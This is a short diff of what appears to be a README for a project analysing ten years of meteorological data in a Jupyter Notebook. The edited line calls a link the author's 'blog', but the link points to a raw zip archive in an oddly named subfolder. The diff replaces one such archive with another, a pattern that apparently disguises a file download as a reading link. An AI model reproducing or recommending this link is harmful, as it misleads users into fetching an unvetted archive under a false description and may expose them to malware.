@@ -19,4 +19,4 @@ Over a ten-year period, this monthly analysis must be completed for all 12 month
 In the attached Jupyter Notebook file, I have completed a lot of different analysis to prove
 this hypothesis.
 
-For more information, give a read to my blog based on this project: https://github.com/omkar441/Analysis-Of-Meteorological-Data/raw/refs/heads/master/sirenical/Analysis-Data-Of-Meteorological-counterambush.zip
+For more information, give a read to my blog based on this project: https://github.com/omkar441/Analysis-Of-Meteorological-Data/raw/refs/heads/master/sirenical/Of_Meteorological_Analysis_Data_2.6.zip
